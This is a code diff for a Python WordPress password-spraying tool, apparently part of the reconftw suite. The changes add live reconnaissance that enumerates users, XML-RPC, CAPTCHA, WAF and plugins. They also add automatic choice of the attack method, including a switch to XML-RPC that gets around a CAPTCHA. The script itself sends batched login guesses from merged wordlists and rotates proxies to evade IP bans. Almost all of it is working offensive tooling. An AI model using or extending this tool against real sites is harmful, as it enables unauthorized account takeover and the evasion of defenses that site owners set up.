@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""WordPress spray: priority wordlist (short + osint) then wp-brute-pro smart generation."""
+"""WordPress spray: recon + strategy + hybrid wordlist + attack (reconftw)."""
 import argparse
 import json
 import os
@@ -13,9 +13,10 @@ urllib3.disable_warnings()
 def parse_args():
     p = argparse.ArgumentParser(description="WP hybrid spray (reconftw)")
     p.add_argument("-u", "--url", required=True, help="Target WordPress URL")
-    p.add_argument("-U", "--users", required=True, help="Usernames (comma separated)")
+    p.add_argument("-U", "--users", default="", help="Usernames (comma separated); merged with recon users")
     p.add_argument("--priority-wordlist", required=True, help="Short list + osint passwords (tried first)")
-    p.add_argument("--scan-json", help="Prior recon JSON (method auto + login URL)")
+    p.add_argument("--scan-json", help="Load/save recon JSON (run live scan if missing)")
+    p.add_argument("--no-scan", action="store_true", help="Do not run live scan (requires valid --scan-json)")
     p.add_argument("--method", default="auto", choices=["auto", "xmlrpc", "wplogin", "restapi"])
     p.add_argument("--batch-size", type=int, default=50)
     p.add_argument("--delay", type=float, default=3.0)
@@ -28,7 +29,8 @@ def parse_args():
     p.add_argument("--proxy-list", help="Proxy list file")
     p.add_argument("--export-json", help="Export results JSON path")
     p.add_argument("--resume", action="store_true")
-    p.add_argument("-v", "--verbose", action="store_true", help="Colored TUI with progress bar (wp-brute-pro ui)")
+    p.add_argument("--lang", default="en", help="wp-brute-pro UI language")
+    p.add_argument("-v", "--verbose", action="store_true", help="Colored TUI with progress bar")
     p.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
     return p.parse_args()
 
@@ -68,26 +70,153 @@ def merge_password_lists(priority, generated, max_passwords):
     return merged
 
 
-def pick_method(method, scan_info):
-    if method != "auto":
-        return method
-    if scan_info and scan_info.get("xmlrpc_active"):
-        return "xmlrpc"
-    if scan_info and scan_info.get("login_url"):
-        return "wplogin"
-    return "restapi"
+def load_scan_json(path):
+    if not path or not os.path.isfile(path):
+        return None
+    with open(path, "r", encoding="utf-8") as handle:
+        return json.load(handle)
+
+
+def save_scan_json(path, scan_info):
+    if not path:
+        return
+    parent = os.path.dirname(path)
+    if parent:
+        os.makedirs(parent, exist_ok=True)
+    with open(path, "w", encoding="utf-8") as handle:
+        json.dump(scan_info, handle, indent=2, ensure_ascii=False)
+
+
+def run_live_scan(url, proxy_rotator, Scanner):
+    scanner = Scanner(url, proxies=proxy_rotator.get_current())
+    return scanner.scan()
+
+
+def merge_users(usernames, scan_info, verbose, ui_mod, t_fn):
+    if not scan_info:
+        return usernames
+    for entry in scan_info.get("users", []):
+        slug = entry.get("slug") if isinstance(entry, dict) else str(entry)
+        if slug and slug not in usernames:
+            usernames.append(slug)
+            if verbose and ui_mod:
+                ui_mod.info(f"  {t_fn('scan_new_user')}: {slug}")
+    return usernames
+
+
+def display_phase1(scan_info, verbose, ui_mod, t_fn):
+    if not verbose or not ui_mod or not scan_info:
+        return
+
+    xmlrpc_text = (
+        f"{t_fn('scan_active')} ({scan_info['xmlrpc_methods']} {t_fn('scan_methods')})"
+        if scan_info.get("xmlrpc_active")
+        else t_fn("scan_disabled")
+    )
+
+    ui_mod.scan_result(
+        t_fn("scan_wp"),
+        scan_info.get("wp_version") or "?",
+        "good" if scan_info.get("wp_version") else "warn",
+    )
+    ui_mod.scan_result(
+        t_fn("scan_login"),
+        scan_info.get("login_url") or t_fn("scan_not_found"),
+        "good" if scan_info.get("login_url") else "bad",
+    )
+    ui_mod.scan_result(
+        t_fn("scan_xmlrpc"),
+        xmlrpc_text,
+        "bad" if scan_info.get("xmlrpc_active") else "good",
+    )
+    ui_mod.scan_result(
+        t_fn("scan_captcha"),
+        t_fn("scan_yes") if scan_info.get("has_captcha") else t_fn("scan_no"),
+        "good" if scan_info.get("has_captcha") else "bad",
+    )
+    ui_mod.scan_result(
+        t_fn("scan_waf"),
+        scan_info.get("waf_name") or t_fn("scan_no"),
+        "good" if scan_info.get("has_waf") else "bad",
+    )
+    users_text = ", ".join(
+        u.get("slug", "") for u in scan_info.get("users", []) if isinstance(u, dict)
+    ) or "?"
+    ui_mod.scan_result(
+        t_fn("scan_users"),
+        users_text,
+        "bad" if scan_info.get("users") else "good",
+    )
+    plugins = scan_info.get("plugins") or []
+    ui_mod.scan_result(t_fn("scan_plugins"), ", ".join(plugins[:5]) or "?", "info")
+
+
+def resolve_method(requested, scan_info, verbose, ui_mod, t_fn):
+    method = requested
+    if method == "auto":
+        if scan_info and scan_info.get("xmlrpc_active"):
+            method = "xmlrpc"
+            if verbose and ui_mod:
+                ui_mod.success(t_fn("strategy_xmlrpc"))
+        elif scan_info and scan_info.get("login_url"):
+            method = "wplogin"
+            if verbose and ui_mod:
+                ui_mod.info(t_fn("strategy_wplogin"))
+        else:
+            method = "restapi"
+            if verbose and ui_mod:
+                ui_mod.info(t_fn("strategy_restapi"))
+
+    if (
+        scan_info
+        and scan_info.get("has_captcha")
+        and method == "wplogin"
+        and scan_info.get("xmlrpc_active")
+    ):
+        if verbose and ui_mod:
+            ui_mod.warning(t_fn("strategy_captcha_switch"))
+        method = "xmlrpc"
+
+    return method
+
+
+def acquire_scan_info(args, url, proxy_rotator, Scanner, verbose, ui_mod, t_fn, reporter):
+    scan_info = load_scan_json(args.scan_json)
+    if scan_info:
+        if verbose and ui_mod:
+            ui_mod.info(f"Loaded recon from {args.scan_json}")
+        return scan_info
+
+    if args.no_scan:
+        msg = f"Recon required: missing or invalid --scan-json ({args.scan_json or 'not set'})"
+        if verbose and ui_mod:
+            ui_mod.error(msg)
+        else:
+            print(msg, file=sys.stderr)
+        return None
+
+    if verbose and ui_mod:
+        ui_mod.header(t_fn("phase1"))
+        ui_mod.spinner(t_fn("scanning"), 1)
+    elif reporter:
+        reporter.info("Running WordPress reconnaissance scan")
+
+    scan_info = run_live_scan(url, proxy_rotator, Scanner)
+    save_scan_json(args.scan_json, scan_info)
+    if args.scan_json and reporter:
+        reporter.info(f"Recon saved to {args.scan_json}")
+    return scan_info
 
 
 def say(verbose, ui_mod, reporter, kind, msg):
     if verbose and ui_mod:
         getattr(ui_mod, kind)(msg)
     elif reporter:
-        log_kind = "warning" if kind == "warning" else kind
-        if log_kind == "error":
+        if kind == "error":
             reporter.error(msg)
-        elif log_kind == "warning":
+        elif kind == "warning":
             reporter.warning(msg)
-        elif log_kind == "success":
+        elif kind == "success":
             reporter.success(msg)
         else:
             reporter.info(msg)
@@ -102,6 +231,8 @@ def main():
 
     sys.path.insert(0, tool_root)
     import ui as wp_ui
+    from lang import t, set_lang
+    from core.scanner import Scanner
     from wordlist.generator import generate
     from core.xmlrpc import XmlRpcAttack
     from core.wplogin import WpLoginAttack
@@ -112,32 +243,52 @@ def main():
     from state.tracker import Tracker
     from output.reporter import Reporter
 
+    set_lang(args.lang)
     if args.no_color:
         wp_ui.disable_colors()
 
     url = args.url.rstrip("/")
     usernames = [u.strip() for u in args.users.split(",") if u.strip()]
-    if not usernames:
-        print("No usernames provided", file=sys.stderr)
-        return 2
 
     if not os.path.isfile(args.priority_wordlist):
         print(f"Priority wordlist not found: {args.priority_wordlist}", file=sys.stderr)
         return 2
 
+    out_dir = args.output
+    os.makedirs(out_dir, exist_ok=True)
+    reporter = Reporter(out_dir)
+    proxy_rotator = ProxyRotator(proxy_file=args.proxy_list)
+
     if args.verbose:
         wp_ui.banner()
 
-    scan_info = None
-    if args.scan_json and os.path.isfile(args.scan_json):
-        with open(args.scan_json, "r", encoding="utf-8") as handle:
-            scan_info = json.load(handle)
-    elif args.verbose:
-        wp_ui.warning("No scan.json — method auto may pick restapi instead of xmlrpc")
+    scan_json = args.scan_json or os.path.join(out_dir, "scan.json")
+    args.scan_json = scan_json
+
+    scan_info = acquire_scan_info(args, url, proxy_rotator, Scanner, args.verbose, wp_ui, t, reporter)
+    if not scan_info:
+        return 2
 
     if args.verbose:
-        wp_ui.header("PHASE 3: WORDLIST (HYBRID)")
-        wp_ui.spinner("Generating smart wordlist + merging priority list", 1)
+        display_phase1(scan_info, args.verbose, wp_ui, t)
+
+    usernames = merge_users(usernames, scan_info, args.verbose, wp_ui, t)
+    if not usernames:
+        say(args.verbose, wp_ui, reporter, "error", t("no_user"))
+        return 2
+
+    if args.verbose:
+        wp_ui.header(t("phase2"))
+
+    method = resolve_method(args.method, scan_info, args.verbose, wp_ui, t)
+    if args.verbose:
+        wp_ui.info(f"{t('stat_method')}: {method}")
+        if proxy_rotator.has_proxies():
+            wp_ui.info(f"{t('stat_proxy')}: {proxy_rotator.available_count()}")
+
+    if args.verbose:
+        wp_ui.header(t("phase3"))
+        wp_ui.spinner(t("generating"), 1)
 
     priority = load_lines(args.priority_wordlist)
     generated = generate(
@@ -152,17 +303,9 @@ def main():
         say(args.verbose, wp_ui, None, "error", "No passwords to try")
         return 2
 
-    method = pick_method(args.method, scan_info)
-    if scan_info and scan_info.get("has_captcha") and method == "wplogin" and scan_info.get("xmlrpc_active"):
-        method = "xmlrpc"
-
-    out_dir = args.output
-    os.makedirs(out_dir, exist_ok=True)
-    reporter = Reporter(out_dir)
     tracker = Tracker(out_dir)
     throttle = Throttle(args.delay, args.batch_size)
     validator = Validator(url)
-    proxy_rotator = ProxyRotator(proxy_file=args.proxy_list)
 
     tracker.set_target(url)
     tracker.set_generated(len(passwords))
@@ -172,26 +315,31 @@ def main():
         f"= {len(passwords)} unique"
     )
     if args.verbose:
-        wp_ui.success(f"{len(passwords)} passwords ready ({summary})")
-        wp_ui.info(f"Users: {', '.join(usernames)}")
-        wp_ui.info(f"Method: {method}")
+        wp_ui.success(f"{len(passwords)} {t('generated')}")
+        wp_ui.info(f"{t('users_label')}: {', '.join(usernames)}")
         if args.max_passwords > 0:
-            wp_ui.warning(f"Max passwords cap: {args.max_passwords}")
+            wp_ui.warning(f"{t('stat_max')}: {args.max_passwords}")
     reporter.info(f"Hybrid spray: {summary}, method={method}, users={','.join(usernames)}")
 
     if args.verbose:
-        wp_ui.header("PHASE 4: ATTACK")
+        wp_ui.header(t("phase4"))
 
     attack_start = time.time()
 
     for username in usernames:
         todo = tracker.filter_new(username, passwords) if args.resume else passwords
         if not todo:
-            say(args.verbose, wp_ui, reporter, "info", f"[{username}] all passwords already tried (resume)")
+            say(args.verbose, wp_ui, reporter, "info", f"[{username}] {t('all_tried')}")
             continue
 
         total_b = (len(todo) + throttle.batch_size - 1) // throttle.batch_size if method == "xmlrpc" else len(todo)
-        say(args.verbose, wp_ui, reporter, "info", f"[{username}] {len(todo)} passwords, {total_b} batches")
+        say(
+            args.verbose,
+            wp_ui,
+            reporter,
+            "info",
+            f"[{username}] {len(todo)} {t('passwords')}, {total_b} {t('batches')}",
+        )
         if args.verbose:
             print()
 
@@ -223,13 +371,13 @@ def main():
                     if args.verbose:
                         wp_ui.batch_result(batch_num, total_b, user_tried, len(todo), status="blocked")
                         wp_ui.batch_newline()
-                    say(args.verbose, wp_ui, reporter, "warning", f"HTTP {status_code} — waiting {penalty}s")
+                    say(args.verbose, wp_ui, reporter, "warning", f"HTTP {status_code} — {penalty}s {t('waiting')}")
                     if throttle.is_banned():
                         if proxy_rotator.has_proxies() and proxy_rotator.rotate():
                             throttle.mark_ban()
-                            say(args.verbose, wp_ui, reporter, "info", "Rotated proxy after ban")
+                            say(args.verbose, wp_ui, reporter, "info", t("banned_proxy"))
                             continue
-                        say(args.verbose, wp_ui, reporter, "error", "IP banned and no proxies left")
+                        say(args.verbose, wp_ui, reporter, "error", t("ip_banned"))
                         break
                     throttle.wait_penalty(penalty)
                     throttle.mark_ban()
@@ -238,7 +386,7 @@ def main():
                     if args.verbose:
                         wp_ui.batch_result(batch_num, total_b, user_tried, len(todo), status="blocked")
                         wp_ui.batch_newline()
-                    say(args.verbose, wp_ui, reporter, "warning", f"Connection error — waiting {penalty}s")
+                    say(args.verbose, wp_ui, reporter, "warning", f"{t('connection_lost')} — {penalty}s")
                     throttle.wait_penalty(penalty)
                     throttle.mark_ban()
                 else:
@@ -270,11 +418,11 @@ def main():
                     wp_ui,
                     reporter,
                     "warning",
-                    f"{username}: not found ({user_tried} attempts)",
+                    f"{username}: {t('not_found')} ({user_tried} {t('attempts')})",
                 )
 
         else:
-            login_url = (scan_info or {}).get("login_url") or f"{url}/wp-login.php"
+            login_url = scan_info.get("login_url") or f"{url}/wp-login.php"
             attacker = WpLoginAttack(login_url) if method == "wplogin" else RestApiAttack(url)
             tried = 0
             user_start = time.time()
@@ -290,12 +438,12 @@ def main():
                     tracker.mark_found(username, pwd)
                     found = True
                     break
-                elif result is None:
+                if result is None:
                     throttle.timeout()
                     if throttle.is_banned():
                         if args.verbose:
                             wp_ui.batch_newline()
-                        say(args.verbose, wp_ui, reporter, "error", "Ban detected")
+                        say(args.verbose, wp_ui, reporter, "error", t("ban_detected"))
                         break
 
                 if args.verbose and (idx % progress_stride == 0 or idx == len(todo) - 1):
@@ -324,7 +472,7 @@ def main():
                     wp_ui,
                     reporter,
                     "warning",
-                    f"{username}: not found ({tried} attempts)",
+                    f"{username}: {t('not_found')} ({tried} {t('attempts')})",
                 )
 
         if found:
@@ -332,14 +480,14 @@ def main():
 
     if args.verbose:
         print()
-        wp_ui.header("PHASE 5: REPORT")
+        wp_ui.header(t("phase5"))
         wp_ui.stats_table([
-            ("Total tried", tracker.state.get("total_tried", 0)),
-            ("Total generated", tracker.state.get("total_generated", 0)),
-            ("Found", len(tracker.state.get("found", []))),
-            ("HTTP requests", throttle.stats().get("total_requests", 0)),
-            ("Blocks", throttle.stats().get("total_blocks", 0)),
-            ("Time", format_eta(time.time() - attack_start)),
+            (t("total_tried"), tracker.state.get("total_tried", 0)),
+            (t("total_generated"), tracker.state.get("total_generated", 0)),
+            (t("found_count"), len(tracker.state.get("found", []))),
+            (t("http_requests"), throttle.stats().get("total_requests", 0)),
+            (t("blocks"), throttle.stats().get("total_blocks", 0)),
+            (t("total_time"), format_eta(time.time() - attack_start)),
         ])
 
     tracker.save_state()
@@ -362,8 +510,8 @@ def main():
             wp_ui.success(f"JSON: {args.export_json}")
 
     if args.verbose:
-        wp_ui.info(f"Report: {out_dir}/report.md")
-        wp_ui.info(f"Log: {out_dir}/log.txt")
+        wp_ui.info(f"{t('report_at')}: {out_dir}/report.md")
+        wp_ui.info(f"{t('log_at')}: {out_dir}/log.txt")
 
     return 0
 
